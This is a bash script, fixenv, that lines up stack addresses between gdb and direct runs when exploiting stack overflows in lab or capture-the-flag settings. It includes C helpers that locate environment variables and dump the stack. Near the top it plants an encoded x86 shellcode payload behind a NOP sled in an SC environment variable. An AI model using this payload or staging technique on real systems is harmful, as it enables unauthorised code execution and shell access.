#!/bin/bash
#
# fixenv - A script to make stack addresses sane
# https://github.com/hellman/fixenv
# Copyright (C) 2014 hellman
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.

if [ "$SC" == "" ]; then
export SC=$'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xdd\xc0\xbf\x59\x7f\xfb\x9e\xd9\x74\x24\xf4\x5a\x31\xc9\xb1\x11\x31\x7a\x17\x03\x7a\x17\x83\xb3\x83\x19\x6b\x29\x77\x86\x0d\xff\xe1\x5e\x03\x9c\x64\x79\x33\x4d\x04\xee\xc4\xf9\xc5\x8c\xad\x97\x90\xb2\x7c\x8f\xbe\x34\x81\x4f\xa2\x55\xf5\x6f\x0b\xf3\x81\x0c\x7c\x8e\x1d\xa7\xef\x1e\xb1\x18\x80\xbf\x3e\xd5\x4f\x35\xb5\x6c\xfd\xdb\x5a\xba\xfd\x74\xf6\x4b\x1c\xb7\x78'
fi
export PWD=`pwd`

IFS=" "
unsetenv=(`echo -n 'env -u SSH_CLIENT -u SSH_TTY -u USER -u MAIL -u SSH_CONNECTION -u LOGNAME -u HOME -u LANG -u _ -u TERM COLUMNS=157 LINES=32'`)
envlist=()
fname=""
# "CMD=sh" "ADDR=`perl -e 'print pack("V", 0x1672a0)'`"

# -----------------------------------------------------
# put envorder.c source 
# -----------------------------------------------------
function put_envorder_source {
cat > .envorder.c <<EOF
#include <stdio.h>
#include <string.h>
extern char ** environ;
int main(int argc, char *argv[]) {
    int i,j;
    FILE * fd = fopen(".gdblist", "w");
    for (i = 0; environ[i] != NULL; i++) {
        unsigned char *q, *p;
        p = strchr(environ[i],(int)'=');
        q = environ[i];
        while (q != p)
            fprintf(fd, "\\\\x%02x", *q++);
        q++;
        fprintf(fd, "=");
        while (*q)
            fprintf(fd, "\\\\x%02x", *q++);
        fprintf(fd, "\\\\x0a\n");
    }
    fclose(fd);
    return 0;
}
EOF
}


# -----------------------------------------------------
# put getvar.c source
# -----------------------------------------------------
function put_getvar_source {
cat > .getvar.c <<EOF
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void printvar(char * p, char * varname) {
    unsigned char *q;
    q = (unsigned char *)&p;
    printf("%p  \\\\x%02x\\\\x%02x\\\\x%02x\\\\x%02x  (%s)\\n", p, *q, *(q+1), *(q+2), *(q+3), varname);
}
int main(int argc, char *argv[], char *env[]) {
    if (argc == 2) {
        printvar((char*)getenv(argv[1]), argv[1]);
    } else {
        int i;
        char *p;
        for (i = 0; env[i] != NULL; i++) {
            p = strchr(env[i], (int)'=');
            if (p) {
                *p++ = 0;
                printvar(p, env[i]);
            }
        }
    }
    return 0;
}
EOF
}


# -----------------------------------------------------
# put dump.c source
# -----------------------------------------------------
function put_dump_source {
cat > .dump.c <<EOF
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <ctype.h>

#define DEFAULT_SIZE 0x200

int main (int argc, char* argv[], char *env[]) {
    unsigned char *p, *c, *start, *end;
    start = (void *) ((unsigned int)argv & 0xfffff000);
    end = start + 0x1000;
    start = end - DEFAULT_SIZE;

    if (argc >= 2)
        sscanf(argv[1], "%p", &start);
    if (argc >= 3)
        end = start + abs(atoi(argv[2]));
    fprintf(stderr, "From %p to %p\n", start, end);
    for (p = start; p < end; p += 16) {
        printf("%08x ", p);
        for (c = p; c < p+16; c++)
            printf("%s%02x", (((unsigned int)c & 0x1) ? "" : " "), *c);
        printf("  ");
        for (c = p; c < p+16; c++)
            printf("%c", (isprint(*c) ? *c : '.'));
        printf("\n");
    }
    return 0;
}
EOF
}


# -----------------------------------------------------
# prints env-variable(s) address in memory
# -----------------------------------------------------
function getvar {
    if [ ! -f ".getvar.c" ]; then
        put_getvar_source
        rm -f .getvar
    fi
    if [ ! -f ".getvar" ]; then
        gcc .getvar.c -o .getvar
    fi
    runprog "./.getvar" "${@:1}"
}


# -----------------------------------------------------
# prints env-variable(s) address in memory
# -----------------------------------------------------
function dump {
    if [ ! -f ".dump.c" ]; then
        put_dump_source
        rm -f .dump
    fi
    if [ ! -f ".dump" ]; then
        gcc .dump.c -o .dump
    fi
    runprog "./.dump" "${@:1}"
}


# -----------------------------------------------------
# gets env-vars, ordered as env-vars in gdb
#   resulting array is in envlist (global)
# -----------------------------------------------------
function getenvs {
    if [ ! -f ".envorder.c" ]; then
        put_envorder_source
        rm -f .envorder
    fi
    if [ ! -f ".envorder" ]; then
        gcc .envorder.c -o .envorder
    fi
    IFS=""
    "${unsetenv[@]}" gdb "`pwd`/.envorder" >/dev/null 2>&1 <<EOF
r
q
EOF
    IFS=$'\x0a'
    envs=$(cat .gdblist)
    envlist=()
    for env in $envs; do
        IFS=""
        envlist=("${envlist[@]}" "`printf "$env"`")
    done
}


# -----------------------------------------------------
# runs arguments in gdb
# -----------------------------------------------------
function rungdb {
    rm -f "`pwd`/.launcher"
    checkprog "$1"
    ln -s "$fname" ".launcher"
    IFS=""
    "${unsetenv[@]}" gdb --args "`pwd`/.launcher" "${@:2}"
}


# -----------------------------------------------------
# runs program directly
#   env-vars are ordered like in gdb
# -----------------------------------------------------
function runprog {
    rm -f "`pwd`/.launcher"
    getenvs
    checkprog "$1"
    ln -s "$fname" ".launcher"
    IFS=""
    if [ "$preprog" ]; then
        env -i "${envlist[@]}" "$preprog" "`pwd`/.launcher" "${@:2}"    
    else
        env -i "${envlist[@]}" "`pwd`/.launcher" "${@:2}"
    fi
}


# -----------------------------------------------------
# checks program for existance
#   and returns fullpath
# -----------------------------------------------------
function checkprog {
    fname="`which $1`" #full path
    if [ "${1:0:2}" = "./" ]; then
        fname="`readlink -f "${1:2}"`"
    fi
    if [ ! -e "$fname" ]; then
        echo "Error: cant find program '$fname'"
        exit
    fi
}


# -----------------------------------------------------
# Main switch
# -----------------------------------------------------
IFS=""
case $1 in
    gdb)
        if [ $2 = "--args" ]; then 
            prog="$3"
            args=("${@:3}")
        else
            prog="$2"
            args=("${@:2}")
        fi
        rungdb "${args[@]}"
    ;;
    strace|ltrace)
        preprog="$1"
        runprog "${@:2}"
    ;;
    getvar|getadr)
        getvar "${@:2}"
    ;;
    dump)
        dump "${@:2}"
    ;;
    clean)
        rm -f .getvar .getvar.c
        rm -f .envorder .envorder.c
        rm -f .dump.c .dump
        rm -f .gdblist .launcher
    ;;
    ""|"-h"|"--help")
        echo "Usage:"
        echo "  $0 getvar [var_name] - get address of envvar's value"
        echo "  $0 dump [start_addr [size]] - dump the end of the stack"
        echo
        echo "Running programs:"
        echo "  $0 ./program - run program"
        echo "  $0 strace ./program - run program in strace"
        echo "  $0 ltrace ./program - run program in ltrace"
        echo "  $0 gdb ./program [arg1 [arg2 [ ... ]]] - run program in gdb"
        echo
    ;;
    *) 
        runprog "${@:1}"
    ;;
esac
rm -f .launcher
